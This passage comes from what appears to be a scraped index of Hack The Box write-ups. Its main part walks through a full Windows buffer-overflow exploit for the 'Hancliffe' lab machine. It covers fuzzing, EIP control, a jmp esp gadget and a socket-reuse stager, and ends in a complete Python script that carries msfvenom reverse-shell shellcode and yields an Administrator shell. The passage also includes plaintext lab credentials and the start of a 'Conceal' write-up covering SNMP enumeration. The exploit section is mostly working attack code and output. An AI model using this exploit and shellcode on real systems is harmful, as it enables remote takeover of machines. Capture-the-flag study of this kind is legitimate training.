Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\n\nFuzzing\nWe use fuzzer.py until the application crash inside Immunity Debugger.\n[root:/git/htb/hancliffe]# cat fuzzer.py\n#!/usr/bin/python\n\nimport socket, time, sys\n\nIP = \"172.30.1.118\"\nPORT = 9086\ntimeout = 5\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nbuffer = []\ncounter = 20\nwhile len(buffer) &lt; 30:\n    buffer.append(\"A\" * counter)\n    counter += 20\n\nfor string in buffer:\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(timeout)\n        connect = s.connect((IP, PORT))\n        s.recv(1024)\n        s.send(user)\n        s.recv(1024)\n        s.send(passwd)\n        s.recv(1024)\n        s.send(fullname)\n        s.recv(1024)\n        print(\"Fuzzing with %s bytes\" % len(string))\n        s.send(string)\n        s.recv(1024)\n        s.close()\n    except:\n        print(\"Could not connect to \" + IP + \":\" + str(PORT))\n        sys.exit(0)\n    time.sleep(1)\nWhen the application crashes EIP should be equal to 41414141, the hex value of “AAAA”.\n[root:/git/htb/hancliffe]# ./fuzzer.py\nFuzzing with 20 bytes\nFuzzing with 40 bytes\nFuzzing with 60 bytes\nFuzzing with 80 bytes\nFuzzing with 100 bytes\nCould not connect to 172.30.1.118:9086\n\n\n\n\nCrash Replication & Controlling EIP\nGenerate a cyclic pattern to find the exact offset of the crash. Note: the size must be bigger than the crash offset.\n# Mona\n!mona pc 130\n\n# Metasploit\n[root:/git/htb/hancliffe]# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 130\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A\nEnter the cyclic pattern to your bof script payload:\n[root:/git/htb/hancliffe]# cat bof.py\n#!/usr/bin/python\n\nimport socket\n\nip = \"172.30.1.118\"\nport = 9519\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nprefix = \"\"\noffset = 0\noverflow = \"A\" * offset\nretn = \"\"\npadding = \"\"\npayload = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A\"\npostfix = \"\"\n\nbuffer = prefix + overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(s.recv(1024))\n    s.send(user)\n    print(s.recv(1024))\n    s.send(passwd)\n    print(s.recv(1024))\n    s.send(fullname)\n    print(s.recv(1024))\n    print(\"Sending evil buffer...\")\n    s.send(buffer + \"\\r\\n\")\n    print(\"Done!\")\nexcept:\n    print(\"Could not connect.\")\nRun the script and the application should crash:\n[root:/git/htb/hancliffe]# ./bof.py\nWelcome Brankas Application.\n\nUsername: \nPassword: \nLogin Successfully!\n\nSending evil buffer...\nDone!\n\nThe EIP value is now 41326341. Find the exact offset of the crash with either Mona or Metasploit:\n# Mona\n!mona findmsp -disance 130\n[+] Examining registers\n    EIP contains normal pattern : 0x41326341 (offset 66)\n\n# Metasploit\n[root:/git/htb/hancliffe]# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41326341\n[*] Exact match at offset 66\nModify the bof.py and ..\n.. set offset variable to 66\n.. set retn varible to “BBBB”\n.. clear the payload variable\n[root:/git/htb/hancliffe]# cat bof.py\n[... snip ...]\noffset = 66\noverflow = \"A\" * offset\nretn = \"BBBB\"\npadding = \"\"\npayload = \"\"\nRun bof.py again and the EIP should now be equal to 42424242, the hex value of “BBBB”, meaning we controll EIP.\n\n\n\n\nFinding a Jump Point\nTo get a deeper understanding of the binary, we can change the payload to '\\x43' * 500. This would in theory give us 500 C’s after EIP.\nb = '\\x41' * 66\nb += '\\x42' * 4\nb += '\\x43' * 500\nIf we load MyFirstApp.exe in x64dbg and fire the exploit, we see that at the point of crash, the stack pointer [$esp] is pointing to the area that directly follows the EIP overwrite - 0x0101FF18.\n\nAlthough we sent a total of 500 bytes in this position, this has been heavily truncated to only 10 bytes. This is a big problem, as this won’t suffice for the operations we wish to carry out. However, we do have the full 66 byte \\x41 island that precedes the EIP overwrite at our disposal. As long as we can pass execution into the 10 byte island that follows the overwrite, we can do a short jump back into the 66 byte island.\nAs the $esp register is pointing at the 10 byte island, the first thing we need to do is locate an executable area of memory that contains a jmp esp instruction which is unaffected by ASLR so we can reliably hardcode our exploit to return to this address.\nIn x64dbg, we can do this by inspecting the Memory Map tab and looking at what DLLs are being used. We find 5 DLL’s; msvcrt.dll, kernelbase.dll, kernel32.dll, ws2_32.dll & ntdll.dll. Take note of their respective base address, go to Log and run the command imageinfo &lt;base-dll-address&gt; to retrieve information from the PE header. If the DLL Characteristics flag is set to 0, no protection such as ASLR or DEP are enabled.\n\nThis step can also be done in Immunity using Mona and is much simpler, just write: !mona modules\n\n\nUnfortunate for us, all DLL’s are protected and we have to bypass ASLR somehow. We have two options..\n.. find a JMP ESP within the EXE itself.\n.. create your own malicious DLL and inject it into the program.\nThe easiest of the two would be to find a jump point within the EXE, so lets go with that.\nIn x64dbg go to Memory Map tab and double click on the memory section marked as executable (E in Protection column) for myfirstapp.exe; .text in this case.\n\nWe are sent to the CPU tab, here press CTRL+F and search for JMP ESP and we find 5 jump points. \n\nThis can also be done in Immunity using Mona by writing: !mona jmp -r esp -cpb \"\\x00\"\n\n\nSave the first address, 0x7190239F. Now that we have an address of a jmp esp instruction that will take us to the 10 byte island after the EIP overwrite, we can replace \\x42\\x42\\x42\\x42 in our exploit with said address (keep in mind, this needs to be in reverse order due to the use of little endian).\nOur updated code should now look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"172.30.1.118\"\nport = 9062\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nb = '\\x41' * 66\nb += '\\x9F\\x23\\x90\\x71'\nb += '\\x43' * 500\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(s.recv(1024))\n    s.send(user)\n    print(s.recv(1024))\n    s.send(passwd)\n    print(s.recv(1024))\n    s.send(fullname)\n    print(s.recv(1024))\n    print(\"Sending evil buffer...\")\n    s.send(b)\n    print(\"Done!\")\nexcept:\n    print(\"Could not connect.\")\nBefore running the exploit again, set a breakpoint at our jmp esp instruction. Do so by going to the CPU tab, press CTRL+G and enter the address 7190239F. Toggle a breakpoint by pressing F2, or use any of the menus - once breakpoint is applied the address field should turn red.\nIf we now run the exploit again, we will hit the breakpoint and after stepping into the call (blue arrow pointing down on a dot), we will be taken to our 10 byte island of 0x43, meaning we control execution.\n\nNext we need to jump back to the start of the 66 byte island as mentioned earlier. To do this, we can use a short jump to go backwards. Rather than calculating the exact offset manually, x64dbg can do the heavy lifting for us here!\nIf we scroll up the CPU tab to find the start of the 66 byte island containing the \\x41 bytes, we can see there is a 0x41 at 0x00FCFED4 and also two which directly precede that.\n\nWe cannot copy the address of the first 2 bytes, but we can instead subtract 2 bytes from 0x00FCFED4 to get the address 0x00FCFED2. Now, if we go back to where $esp is pointing (0x00FCFF15) and press the space bar whilst the instruction is highlighted, we will enter the Assemble screen.\nIn here, we can enter jmp 0x00FCFED2, hit OK and it will automatically calculate the distance and create a short jump for us; in this case, EB BB. If everything went correct you should now have a red arrow pointing up to the start of the \\x41 island. You can also verify this by pressing G.\n\nWe can now update the exploit to include this instruction before the \\x43 island that was previously in place and replace the remaining bytes in both the 66 byte and 10 byte islands with NOP sleds so that we can work with them a bit easier later when we are assembling our exploit in the debugger.\nAfter making these changes, the exploit should look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"172.30.1.118\"\nport = 9683\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nb = '\\x90' * 66                     # buffer\nb += '\\x9F\\x23\\x90\\x71'             # jmp esp ; within the exe\nb += '\\xEB\\xBB'                     # jmp 0x00FCFED2 ; start of \\x41 island\nb += '\\x90' * 500                   # NOP sleds\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(s.recv(1024))\n    s.send(user)\n    print(s.recv(1024))\n    s.send(passwd)\n    print(s.recv(1024))\n    s.send(fullname)\n    print(s.recv(1024))\n    print(\"Sending evil buffer...\")\n    s.send(b)\n    print(\"Done!\")\nexcept:\n    print(\"Could not connect.\")\nIf we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite:\n\n\n\n\nAnalysis & Socket Hunting\nThe first thing we need to do before we can start putting together any code is to figure out where we can find the socket that the data our exploit is sending is being received on. Restart the application and set a break point at the either the recv or call eax funtions under the string Input Your Code:, in my case that is 0x71901D79.\n\nAt the breakpoint we can see a few interesting things;\n\nThe recv function ontop of the stack, as seen in the red box on the right.\n\nLooking on these Windows Docs we see that the recv function looks like this:\nint recv(\n  SOCKET s,\n  char   *buf,\n  int    len,\n  int    flags\n);\n\nThe first argument (on the top of the stack) is the socket file descriptor; in this, case the value 0x130\nThe second argument is the buffer, i.e. a pointer to the area of memory that the data received via the socket will be stored. In this case, it will store the received data at 0x653C20\nThe third argument is the amount of data to expect. This has been set at 0x400 bytes (1024 bytes)\nThe final argument is the flags that influence the behaviour of the function. As the default behaviour is being used, this is set to 0\n\n\nWe can also see just above the breakpoint ebp-10 is moved to eax, and on the next instruction eax is moved onto the stack. This means that the socket descriptor is contained at ebp-10. We can confirm this in by searching for the address of ebp-10 (0x00eeff60) in the Dump tabs. This gives us a way to dynamically retrive the socket descriptor for our payload.\n\nTo get the offset calculate 00eeff60 (ebp-10) - 00eeff18 (esp) = 0x48\n\nFor future referenses we also need to grab the address of the recv function. We find this value by either double clicking call or by looking at eax in the top right corner - 0x7323a0.\nIf you press Step over from the breakpoint you’ll land on the next instruction (sub esp,10). Here you can confirm that your input data are in the buffer by searching for the buffer address (0x653c20) in the Dump tabs.\n\nNOTE : This last step has to be done quickly. If the value of EAX is set to FFFFFFFF (SOCKET_ERROR) when you reach sub esp,10 that means you were to slow and the socket has closed.\n\n\n\nWriting the Socket Stager\nDisclaimer: When finalizing this exploit at home the values of my binary differ from the one I had at work thus making some of the values different, although the calculation to get there are still the same. My distance for example is not 0x48 but instead 0x70. Also, the recv address changed from 0x76b323a0 to 0x75dc23a0.\nFollowing the guidlines from rastating we should get something like this:\npush esp                    -&gt; \\x54\npop eax                     -&gt; \\x58\nadd ax,0x70                 -&gt; \\x66\\x83\\xc0\\x70       # socket position\nsub esp,0x70                -&gt; \\x83\\xec\\x70           # gain space, to close to esp\nxor ebx,ebx                 -&gt; \\x31\\xdb\npush ebx                    -&gt; \\x53\nadd bh,0x4                  -&gt; \\x80\\xc7\\x04           # buffer size (0x400)\npush ebx                    -&gt; \\x53\npush esp                    -&gt; \\x54\npop ebx                     -&gt; \\x5b\nadd ebx,x64                 -&gt; \\x83\\xc3\\x64           # where to write payload\npush ebx                    -&gt; \\x53\npush dword ptr ds: [eax]    -&gt; \\xff\\x30\nmov eax,0x75dc23a0          -&gt; \\xa1\\xac\\x82\\x90\\x71   # recv address\ncall eax                    -&gt; \\xff\\xd0               # call recv\ncall ebx                    -&gt; \\xff\\xd3               # call payload\nAll the values can be translated to it’s respective hex values using either metasploit nasm_shell.rb or Immunity Debugger.\n\n\n\nFinalising the Exploit\nWith out stager ready, we place it at the start of the 66 byte NOP sled in our exploit. It’s important the stager doesn’t overwrite the 66-byte buffer, but in our case this is not a problem.\nAdditionally, we will make the exploit wait a few seconds before it sends the final payload, to ensure that our stager has executed.\nThe exploit should now look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"10.10.11.115\"\nport = 9999\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"asdf\"\n\nstager = b'\\x90\\x90\\x90\\x90\\x54\\x58\\x66\\x83'    # NOP sequence | push esp | pop eax | add ax,0x70\nstager += b'\\xc0\\x70\\x83\\xec\\x70\\x31\\xdb\\x53'   # sub esp,0x70 | xor ebx,ebx | push ebx\nstager += b'\\x80\\xc7\\x04\\x53\\x54\\x5b\\x83\\xc3'   # add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64\nstager += b'\\x64\\x53\\xff\\x30\\xa1\\xac\\x82\\x90'   # push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0\nstager += b'\\x71\\xff\\xd0\\xff\\xd3'               # call eax | call ebx\n\nbuffer = stager\nbuffer += b'\\x90' * (66 - len(stager))\nbuffer += b'\\xa8\\x23\\x90\\x71'                   # jmp esp ; within the exe\nbuffer += b'\\xeb\\xb9\\x90\\x90'                   # jmp to stager ; start of 66-byte island\nbuffer += b'\\x90' * 500\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(\"[+] Connected to target: 10.10.11.115:9999\")\n    s.recv(1024)\n    s.send(user)\n    s.recv(1024)\n    s.send(passwd)\n    s.recv(1024)\n    s.send(fullname)\n    s.recv(1024)\n    s.send(buffer)\n    print(\"[+] Sent stager, waiting 5 seconds...\")\nexcept:\n    print(\"[-] Could not connect.\")\nLastly we want to add a payload to the script. Remove generall bad characters \\x00, \\x0a (line feed) and \\x0d (carriage return) and generate the payload.\n[root:/git/htb/hancliffe]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 -f python -v payload EXITFUNC=thread -b \"\\x00\\xa0\\x0d\"\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 351 (iteration=0)\nx86/shikata_ga_nai chosen with final size 351\nPayload size: 351 bytes\nFinal size of python file: 1869 bytes\npayload =  b\"\"\npayload += b\"\\xbb\\x19\\x17\\xb3\\x1e\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x5d\"\npayload += b\"\\x29\\xc9\\xb1\\x52\\x31\\x5d\\x12\\x83\\xed\\xfc\\x03\\x44\"\npayload += b\"\\x19\\x51\\xeb\\x8a\\xcd\\x17\\x14\\x72\\x0e\\x78\\x9c\\x97\"\npayload += b\"\\x3f\\xb8\\xfa\\xdc\\x10\\x08\\x88\\xb0\\x9c\\xe3\\xdc\\x20\"\npayload += b\"\\x16\\x81\\xc8\\x47\\x9f\\x2c\\x2f\\x66\\x20\\x1c\\x13\\xe9\"\npayload += b\"\\xa2\\x5f\\x40\\xc9\\x9b\\xaf\\x95\\x08\\xdb\\xd2\\x54\\x58\"\npayload += b\"\\xb4\\x99\\xcb\\x4c\\xb1\\xd4\\xd7\\xe7\\x89\\xf9\\x5f\\x14\"\npayload += b\"\\x59\\xfb\\x4e\\x8b\\xd1\\xa2\\x50\\x2a\\x35\\xdf\\xd8\\x34\"\npayload += b\"\\x5a\\xda\\x93\\xcf\\xa8\\x90\\x25\\x19\\xe1\\x59\\x89\\x64\"\npayload += b\"\\xcd\\xab\\xd3\\xa1\\xea\\x53\\xa6\\xdb\\x08\\xe9\\xb1\\x18\"\npayload += b\"\\x72\\x35\\x37\\xba\\xd4\\xbe\\xef\\x66\\xe4\\x13\\x69\\xed\"\npayload += b\"\\xea\\xd8\\xfd\\xa9\\xee\\xdf\\xd2\\xc2\\x0b\\x6b\\xd5\\x04\"\npayload += b\"\\x9a\\x2f\\xf2\\x80\\xc6\\xf4\\x9b\\x91\\xa2\\x5b\\xa3\\xc1\"\npayload += b\"\\x0c\\x03\\x01\\x8a\\xa1\\x50\\x38\\xd1\\xad\\x95\\x71\\xe9\"\npayload += b\"\\x2d\\xb2\\x02\\x9a\\x1f\\x1d\\xb9\\x34\\x2c\\xd6\\x67\\xc3\"\npayload += b\"\\x53\\xcd\\xd0\\x5b\\xaa\\xee\\x20\\x72\\x69\\xba\\x70\\xec\"\npayload += b\"\\x58\\xc3\\x1a\\xec\\x65\\x16\\x8c\\xbc\\xc9\\xc9\\x6d\\x6c\"\npayload += b\"\\xaa\\xb9\\x05\\x66\\x25\\xe5\\x36\\x89\\xef\\x8e\\xdd\\x70\"\npayload += b\"\\x78\\xbb\\x2b\\x74\\x76\\xd3\\x29\\x88\\x97\\xab\\xa7\\x6e\"\npayload += b\"\\xfd\\xbb\\xe1\\x39\\x6a\\x25\\xa8\\xb1\\x0b\\xaa\\x66\\xbc\"\npayload += b\"\\x0c\\x20\\x85\\x41\\xc2\\xc1\\xe0\\x51\\xb3\\x21\\xbf\\x0b\"\npayload += b\"\\x12\\x3d\\x15\\x23\\xf8\\xac\\xf2\\xb3\\x77\\xcd\\xac\\xe4\"\npayload += b\"\\xd0\\x23\\xa5\\x60\\xcd\\x1a\\x1f\\x96\\x0c\\xfa\\x58\\x12\"\npayload += b\"\\xcb\\x3f\\x66\\x9b\\x9e\\x04\\x4c\\x8b\\x66\\x84\\xc8\\xff\"\npayload += b\"\\x36\\xd3\\x86\\xa9\\xf0\\x8d\\x68\\x03\\xab\\x62\\x23\\xc3\"\npayload += b\"\\x2a\\x49\\xf4\\x95\\x32\\x84\\x82\\x79\\x82\\x71\\xd3\\x86\"\npayload += b\"\\x2b\\x16\\xd3\\xff\\x51\\x86\\x1c\\x2a\\xd2\\xa6\\xfe\\xfe\"\npayload += b\"\\x2f\\x4f\\xa7\\x6b\\x92\\x12\\x58\\x46\\xd1\\x2a\\xdb\\x62\"\npayload += b\"\\xaa\\xc8\\xc3\\x07\\xaf\\x95\\x43\\xf4\\xdd\\x86\\x21\\xfa\"\npayload += b\"\\x72\\xa6\\x63\"\nAdd payload to your script, making your final product looking like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\nimport time\n\nip = \"10.10.11.115\"\nport = 9999\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"asdf\"\n\n# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 -f python -v payload EXITFUNC=thread -b \"\\x00\\xa0\\x0d\"\npayload =  b\"\"\npayload += b\"\\xbb\\x19\\x17\\xb3\\x1e\\xda\\xd6\\xd9\\x74\\x24\\xf4\\x5d\"\npayload += b\"\\x29\\xc9\\xb1\\x52\\x31\\x5d\\x12\\x83\\xed\\xfc\\x03\\x44\"\npayload += b\"\\x19\\x51\\xeb\\x8a\\xcd\\x17\\x14\\x72\\x0e\\x78\\x9c\\x97\"\npayload += b\"\\x3f\\xb8\\xfa\\xdc\\x10\\x08\\x88\\xb0\\x9c\\xe3\\xdc\\x20\"\npayload += b\"\\x16\\x81\\xc8\\x47\\x9f\\x2c\\x2f\\x66\\x20\\x1c\\x13\\xe9\"\npayload += b\"\\xa2\\x5f\\x40\\xc9\\x9b\\xaf\\x95\\x08\\xdb\\xd2\\x54\\x58\"\npayload += b\"\\xb4\\x99\\xcb\\x4c\\xb1\\xd4\\xd7\\xe7\\x89\\xf9\\x5f\\x14\"\npayload += b\"\\x59\\xfb\\x4e\\x8b\\xd1\\xa2\\x50\\x2a\\x35\\xdf\\xd8\\x34\"\npayload += b\"\\x5a\\xda\\x93\\xcf\\xa8\\x90\\x25\\x19\\xe1\\x59\\x89\\x64\"\npayload += b\"\\xcd\\xab\\xd3\\xa1\\xea\\x53\\xa6\\xdb\\x08\\xe9\\xb1\\x18\"\npayload += b\"\\x72\\x35\\x37\\xba\\xd4\\xbe\\xef\\x66\\xe4\\x13\\x69\\xed\"\npayload += b\"\\xea\\xd8\\xfd\\xa9\\xee\\xdf\\xd2\\xc2\\x0b\\x6b\\xd5\\x04\"\npayload += b\"\\x9a\\x2f\\xf2\\x80\\xc6\\xf4\\x9b\\x91\\xa2\\x5b\\xa3\\xc1\"\npayload += b\"\\x0c\\x03\\x01\\x8a\\xa1\\x50\\x38\\xd1\\xad\\x95\\x71\\xe9\"\npayload += b\"\\x2d\\xb2\\x02\\x9a\\x1f\\x1d\\xb9\\x34\\x2c\\xd6\\x67\\xc3\"\npayload += b\"\\x53\\xcd\\xd0\\x5b\\xaa\\xee\\x20\\x72\\x69\\xba\\x70\\xec\"\npayload += b\"\\x58\\xc3\\x1a\\xec\\x65\\x16\\x8c\\xbc\\xc9\\xc9\\x6d\\x6c\"\npayload += b\"\\xaa\\xb9\\x05\\x66\\x25\\xe5\\x36\\x89\\xef\\x8e\\xdd\\x70\"\npayload += b\"\\x78\\xbb\\x2b\\x74\\x76\\xd3\\x29\\x88\\x97\\xab\\xa7\\x6e\"\npayload += b\"\\xfd\\xbb\\xe1\\x39\\x6a\\x25\\xa8\\xb1\\x0b\\xaa\\x66\\xbc\"\npayload += b\"\\x0c\\x20\\x85\\x41\\xc2\\xc1\\xe0\\x51\\xb3\\x21\\xbf\\x0b\"\npayload += b\"\\x12\\x3d\\x15\\x23\\xf8\\xac\\xf2\\xb3\\x77\\xcd\\xac\\xe4\"\npayload += b\"\\xd0\\x23\\xa5\\x60\\xcd\\x1a\\x1f\\x96\\x0c\\xfa\\x58\\x12\"\npayload += b\"\\xcb\\x3f\\x66\\x9b\\x9e\\x04\\x4c\\x8b\\x66\\x84\\xc8\\xff\"\npayload += b\"\\x36\\xd3\\x86\\xa9\\xf0\\x8d\\x68\\x03\\xab\\x62\\x23\\xc3\"\npayload += b\"\\x2a\\x49\\xf4\\x95\\x32\\x84\\x82\\x79\\x82\\x71\\xd3\\x86\"\npayload += b\"\\x2b\\x16\\xd3\\xff\\x51\\x86\\x1c\\x2a\\xd2\\xa6\\xfe\\xfe\"\npayload += b\"\\x2f\\x4f\\xa7\\x6b\\x92\\x12\\x58\\x46\\xd1\\x2a\\xdb\\x62\"\npayload += b\"\\xaa\\xc8\\xc3\\x07\\xaf\\x95\\x43\\xf4\\xdd\\x86\\x21\\xfa\"\npayload += b\"\\x72\\xa6\\x63\"\n\nstager = b'\\x90\\x90\\x90\\x90\\x54\\x58\\x66\\x83'    # NOP sequence | push esp | pop eax | add ax,0x70\nstager += b'\\xc0\\x70\\x83\\xec\\x70\\x31\\xdb\\x53'   # sub esp,0x70 | xor ebx,ebx | push ebx\nstager += b'\\x80\\xc7\\x04\\x53\\x54\\x5b\\x83\\xc3'   # add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64\nstager += b'\\x64\\x53\\xff\\x30\\xa1\\xac\\x82\\x90'   # push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0\nstager += b'\\x71\\xff\\xd0\\xff\\xd3'               # call eax | call ebx\n\nbuffer = stager\nbuffer += b'\\x90' * (66 - len(stager))\nbuffer += b'\\xa8\\x23\\x90\\x71'                   # jmp esp ; within the exe\nbuffer += b'\\xeb\\xb9\\x90\\x90'                   # jmp to stager ; start of 66-byte island\nbuffer += b'\\x90' * 500\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(\"[+] Connected to target: 10.10.11.115:9999\")\n    s.recv(1024)\n    s.send(user)\n    s.recv(1024)\n    s.send(passwd)\n    s.recv(1024)\n    s.send(fullname)\n    s.recv(1024)\n    s.send(buffer)\n    print(\"[+] Sent stager, waiting 5 seconds...\")\n    time.sleep(5)\n    s.send(payload + b'\\x90' * (1024 - len(payload)))\n    print(\"[+] Sent payload, check for incomming shell!\")\nexcept:\n    print(\"[-] Could not connect.\")\nRun the script to get Administrator shell!\n[root:/git/htb/hancliffe]# ./final_bof.py\n[+] Connected to target: 10.10.11.115:9999\n[+] Sent stager, waiting 5 seconds...\n[+] Sent payload, check for incomming shell!\n[root:/git/htb/hancliffe]# nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.14] from (UNKNOWN) [10.10.11.115] 54473\nMicrosoft Windows [Version 10.0.19043.1266]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nhancliffe\\administrator\n\nC:\\Windows\\system32&gt;type C:\\Users\\Administrator\\Desktop\\root.txt\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n5018882876cc460554809abe9140eb89\n\n\n\n\n\nReferences\nnginx parser logic:\nhttps://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf\nnuxeo authentication bypass rce:\nhttps://github.com/mpgn/CVE-2018-16341\nfirefox decrypt:\nhttps://github.com/unode/firefox_decrypt\nascii, hex, bin, dec, converter:\nhttps://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html\nbuffer overflow:\nhttps://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/\nhttps://liodeus.github.io/2020/08/11/bufferOverflow.html\nhttps://0xrick.github.io/binary-exploitation/bof5/\nhttps://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true\nhttps://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03\nhttps://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow\nhttps://snowscan.io/htb-writeup-bighead/#\nhttp://mislusnys.github.io/post/htb-bighead/"
  },
  {
    "objectID": "posts/2021-03-24-htb-writeup-conceal/2021-03-24-htb-writeup-conceal.html",
    "href": "posts/2021-03-24-htb-writeup-conceal/2021-03-24-htb-writeup-conceal.html",
    "title": "Conceal - Hack The Box",
    "section": "",
    "text": "██╗   ██╗███████╗███████╗██████╗\n   ██║   ██║██╔════╝██╔════╝██╔══██╗\n   ██║   ██║███████╗█████╗  ██████╔╝\n   ██║   ██║╚════██║██╔══╝  ██╔══██╗\n   ╚██████╔╝███████║███████╗██║  ██║\n    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝\n\n1. Normal nmap scans finds nothing, even flag -p- doesn't find anything. Instead we go for UDP;\n\n[root:/git/htb/conceal]# nmap -sU -sV --version-intensity 0 -F -n 10.10.10.116\nPORT    STATE SERVICE VERSION\n161/udp open  snmp    SNMPv1 server (public)\n500/udp open  isakmp?\nService Info: Host: Conceal\n\n\n2. With SNMP found, we can try to enumerate by guessing the community string is set to 'public', using snmp-check.\n\n[root:/git/htb/conceal]# snmp-check 10.10.10.116 -p 161 -c public                                                                 (master✱)\n  snmp-check v1.9 - SNMP enumerator\n\n  [+] Try to connect to 10.10.10.116:161 using SNMPv1 and community 'public'\n    Host IP address               : 10.10.10.116\n    Hostname                      : Conceal\n    Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)\n    Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43\n    Location                      : -\n    Uptime snmp                   : 02:56:40.59\n    Uptime system                 : 02:56:27.05\n    System date                   : 2021-3-23 12:37:35.9\n    Domain                        : WORKGROUP\n\n  [*] User accounts:\n    Guest\n    Destitute\n    Administrator\n    DefaultAccount\n\n  [*] TCP connections and listening ports:\n    Local address         Local port            Remote address        Remote port           State\n    0.0.0.0               21                    0.0.0.0               0                     listen\n    0.0.0.0               80                    0.0.0.0               0                     listen\n    0.0.0.0               135                   0.0.0.0               0                     listen\n    0.0.0.0               445                   0.0.0.0               0                     listen\n    0.0.0.0               49664                 0.0.0.0               0                     listen\n    0.0.0.0               49665                 0.0.0.0               0                     listen\n    0.0.0.0               49666                 0.0.0.0               0                     listen\n    0.0.0.0               49667                 0.0.0.0               0                     listen\n    0.0.0.0               49668                 0.0.0.0               0                     listen\n    0.0.0.0               49669                 0.0.0.0               0                     listen\n    0.0.0.0               49670                 0.0.0.0               0                     listen\n    10.10.10.116          139                   0.0.0.0               0                     listen\n\n  [*] Listening UDP ports:\n    Local address         Local port\n    0.0.0.0               123\n    0.0.0.0               161\n    0.0.0.0               500\n    0.0.0.0               4500\n    0.0.0.0               5050\n    0.0.0.0               5353\n    0.0.0.0               5355\n    0.0.0.0               62345\n    10.10.10.116          137\n    10.10.10.116          138\n    10.10.10.116          1900\n    10.10.10.116          50998\n  